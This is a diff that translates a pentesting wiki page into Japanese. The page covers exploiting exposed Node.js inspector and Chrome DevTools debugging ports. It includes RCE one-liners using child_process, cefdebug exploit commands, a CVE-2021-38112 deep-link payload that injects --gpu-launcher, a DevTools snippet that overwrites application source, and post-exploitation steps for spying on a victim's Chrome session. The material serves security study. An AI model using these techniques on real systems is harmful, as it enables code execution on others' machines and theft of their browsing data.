@@ -2,17 +2,16 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Information
+## 基本情報
 
-[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.
+[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` スイッチで起動すると、Node.js プロセスはデバッグクライアントを待ち受けます。**デフォルト**では、ホストとポート **`127.0.0.1:9229`** で待ち受けます。各プロセスには **ユニーク** な **UUID** も割り当てられます。
 
-Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+インスペクタクライアントは、接続するためにホストアドレス、ポート、および UUID を知って指定する必要があります。完全な URL は `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。
 
 > [!WARNING]
-> Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).
+> **デバッガーは Node.js 実行環境への完全なアクセス権を持っているため**、このポートに接続できる悪意のあるアクターは、Node.js プロセスの代わりに任意のコードを実行できる可能性があります（**潜在的な特権昇格**）。
 
-There are several ways to start an inspector:
-
+インスペクタを起動する方法はいくつかあります：
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -23,58 +22,48 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-
-When you start an inspected process something like this will appear:
-
+検査されたプロセスを開始すると、次のようなものが表示されます：
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
+プロセスは、**CEF**（**Chromium Embedded Framework**）に基づいており、**デバッガ**を開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。しかし、**NodeJS** **デバッグ**セッションを付与する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。
 
-Processes based on **CEF** (**Chromium Embedded Framework**) like need to use the param: `--remote-debugging-port=9222` to open de **debugger** (the SSRF protections remain very similar). However, they **instead** of granting a **NodeJS** **debug** session will communicate with the browser using the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), this is an interface to control the browser, but there isn't a direct RCE.
-
-When you start a debugged browser something like this will appear:
-
+デバッグされたブラウザを起動すると、次のようなものが表示されます：
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
+### ブラウザ、WebSocket、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
-
-Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** or **`localhost6`** precisely.
+ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**ユニークなデバッガセッションIDを取得するためには、初期HTTP接続が必要です**。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。**DNSリバインディング攻撃**に対する追加のセキュリティとして、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを確認します。
 
 > [!NOTE]
-> This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).
+> この**セキュリティ対策は、インスペクタを悪用してコードを実行することを防ぎます**。**単にHTTPリクエストを送信することで**（これはSSRF脆弱性を悪用して行うことができたかもしれません）。
 
-### Starting inspector in running processes
+### 実行中のプロセスでインスペクタを開始する
 
-You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.
-
+実行中のnodejsプロセスに**SIGUSR1信号**を送信することで、**デフォルトポートでインスペクタを開始させる**ことができます。ただし、十分な権限が必要であるため、これにより**プロセス内の情報への特権アクセスが得られる可能性がありますが、直接的な特権昇格はありません**。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-
 > [!NOTE]
-> This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.
+> これはコンテナ内で便利です。なぜなら、`--inspect`で**プロセスをシャットダウンして新しいプロセスを開始する**ことは**選択肢ではない**からです。**コンテナ**はプロセスと共に**終了**します。
 
-### Connect to inspector/debugger
+### インスペクタ/デバッガに接続する
 
-To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:
+**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdgeそれぞれのために`chrome://inspect`または`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
 
 ![](<../../images/image (674).png>)
 
-Using the **command line** you can connect to a debugger/inspector with:
-
+**コマンドライン**を使用して、次のようにデバッガ/インスペクタに接続できます：
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-
-The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.
-
+ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) は、**ローカルで実行されているインスペクターを見つけ**、**コードを注入する**ことを可能にします。
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -83,76 +72,67 @@ The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefd
 #Exploit it
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
+> [!NOTE]
+> **NodeJS RCEの脆弱性は、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を介してブラウザに接続されている場合は機能しない**ことに注意してください（APIを確認して、興味深いことをする方法を見つける必要があります）。
+
+## NodeJSデバッガー/インスペクターにおけるRCE
 
 > [!NOTE]
-> Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).
+> [**ElectronのXSSからRCEを取得する方法を探している場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 
-## RCE in NodeJS Debugger/Inspector
-
-> [!NOTE]
-> If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
-
-Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):
-
+Node **インスペクター**に**接続**できるときに**RCE**を取得する一般的な方法のいくつかは、（これは**Chrome DevToolsプロトコルへの接続では機能しないようです**）を使用することです：
 ```javascript
 process.mainModule.require("child_process").exec("calc")
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
 require("child_process").spawnSync("calc.exe")
 Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ```
-
 ## Chrome DevTools Protocol Payloads
 
-You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-In this section I will just list interesting things I find people have used to exploit this protocol.
+APIはここで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+このセクションでは、私が人々がこのプロトコルを悪用するために使用した興味深いことをリストします。
 
-### Parameter Injection via Deep Links
+### Deep Linksによるパラメータインジェクション
 
-In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)で、RhinoセキュリティはCEFに基づくアプリケーションがシステムにカスタムURI（workspaces://）を登録し、完全なURIを受け取り、そのURIから部分的に構成された設定でCEFベースのアプリケーションを起動することを発見しました。
 
-It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.
+URIパラメータはURLデコードされ、CEF基本アプリケーションを起動するために使用され、ユーザーが**`--gpu-launcher`**フラグを**コマンドライン**に**インジェクト**し、任意のものを実行できることが判明しました。
 
-So, a payload like:
-
+したがって、ペイロードは次のようになります:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
+calc.exeを実行します。
 
-Will execute a calc.exe.
+### ファイルの上書き
 
-### Overwrite Files
-
-Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.
-
+**ダウンロードしたファイルが保存されるフォルダ**を変更し、アプリケーションの**ソースコード**を**悪意のあるコード**で**上書き**するためにファイルをダウンロードします。
 ```javascript
 ws = new WebSocket(url) //URL of the chrome devtools service
 ws.send(
-  JSON.stringify({
-    id: 42069,
-    method: "Browser.setDownloadBehavior",
-    params: {
-      behavior: "allow",
-      downloadPath: "/code/",
-    },
-  })
+JSON.stringify({
+id: 42069,
+method: "Browser.setDownloadBehavior",
+params: {
+behavior: "allow",
+downloadPath: "/code/",
+},
+})
 )
 ```
+### Webdriver RCEと情報漏洩
 
-### Webdriver RCE and exfiltration
+この投稿によると: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCEを取得し、内部ページをtheriverから情報漏洩させることが可能です。
 
-According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) it's possible to obtain RCE and exfiltrate internal pages from theriver.
+### ポストエクスプロイト
 
-### Post-Exploitation
+実際の環境で、**ユーザーのPCを侵害した後**、Chrome/Chromiumベースのブラウザを使用している場合、**デバッグを有効にしてデバッグポートをポートフォワード**したChromeプロセスを起動することができます。これにより、**被害者がChromeで行うすべてを検査し、機密情報を盗むことができます**。
 
-In a real environment and **after compromising** a user PC that uses Chrome/Chromium based browser you could launch a Chrome process with the **debugging activated and port-forward the debugging port** so you can access it. This way you will be able to **inspect everything the victim does with Chrome and steal sensitive information**.
-
-The stealth way is to **terminate every Chrome process** and then call something like
-
+ステルスな方法は、**すべてのChromeプロセスを終了**させてから、次のようなものを呼び出すことです。
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
-
-## References
+## 参考文献
 
 - [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
 - [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
